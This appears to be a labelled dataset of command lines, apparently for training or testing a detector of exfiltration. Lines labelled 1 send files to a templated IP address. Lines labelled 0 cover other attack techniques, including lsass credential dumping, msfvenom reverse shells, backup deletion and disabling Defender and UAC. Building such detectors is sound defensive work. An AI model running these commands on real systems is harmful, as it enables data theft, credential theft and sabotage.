1	curl -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
1	xcopy ${source_file_path} ${destination_file_path}
1	xcopy ${source_directory} ${destination_directory} /s /e
1	robocopy ${source_directory} ${destination_directory} /e
1	robocopy ${source_file_path} ${destination_file_path} /mir
1	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
1	pscp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
1	rsync -avz ${source_file_path} ${destination_file_path}
1	rsync ${source_file_path} ${username}@${ip_address}:${destination_file_path}
1	rclone.exe copy C:\Users\Public\collect.7z ${account}:backup
1	nc -vn ${ip_address} ${port} < ${source_file_path}
1	cat ${source_file_path} > /dev/tcp/${ip_address}/${port}
1	curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
1	curl -X POST --upload-file ${source_file_path} http://${ip_address}:${port}/upload
1	curl -X POST -d "@${source_file_path}" http://${ip_address}:${port}/upload
1	cat ${source_file_path} | nc ${ip_address} ${port}
1	cat ${source_file_path} | nc -vn ${ip_address} ${port}
1	telnet ${ip_address} ${port} < ${source_file_path}
1	cat ${source_file_path} | telnet ${ip_address} ${port}
1	socat - TCP:${ip_address}:${port} < ${source_file_path}
1	cat ${source_file_path} | socat - TCP:${ip_address}:${port}
1	wget --post-file=${source_file_path} ${ip_address}:${port}
1	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path}
1	Start-BitsTransfer -Source ${source_file_path} -Destination ${destination_file_path} -Asynchronous
1	cat ${source_file_path} | ssh ${username}@${ip_address} 'cat > ${destination_file_path}'
1	scp -r ${source_directory} ${username}@${ip_address}:${destination_directory}
1	CertReq -Post -config ${destination_file_path} ${source_file_path}
1	sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
1	certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
1	Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
0	powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
0	putty -ssh ${username}@${ip_address} -pw ${password}
0	7z a archive.7z ${source_file_path}
0	mimikatz.exe "sekurlsa::minidump lsassdump.dmp" "sekurlsa::logonpasswords full" exit
0	wbadmin delete systemstatebackup -keepVersions:0
0	powershell -c "bitsadmin.exe /transfer download /Priority HIGH ${source_file_path} ${destination_file_path}"
0	tar -cvfW archive.tar ${source_directory}
0	cmd.exe /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
0	msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
0	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ${value_name} /t REG_DWORD /d ${value}
0	zip -r archive.zip ${source_directory}
0	powershell -c "choco install -y 7zip"
0	net.exe stop ${service_name} && sc.exe config ${service_name} start=disabled
0	wbadmin delete catalog -quiet
0	wbadmin delete systemstatebackup -keepVersions:0
0	schtasks /create /tn win32times /sc onstart /ru system /tr "${command_to_execute}"
0	procdump -ma lsass.exe lsassdump.dmp
0	reg add hkcu\software\classes\mscfile\shell\open\command /ve /d "${command_to_execute}" /f
0	powershell -c "choco install -y 7zip"
0	mstsc /v:${ip_address} /f
0	cmd.exe /c "taskkill.exe /f /im ${process_name}"
0	powershell -c "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
0	powershell -c "wmic /node:"${ip_address}" shadowcopy call create Volume=C:"
0	red add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
0	copy ${source_file_path} \\${ip_address}\${destination_file_path}
0	powershell -c "cipher.exe /w:C:"
0	cmd.exe /c "choco install 7zip"
0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
0	7z a archive.7z ${source_directory}
0	tar -cvfW archive.tar ${source_directory}
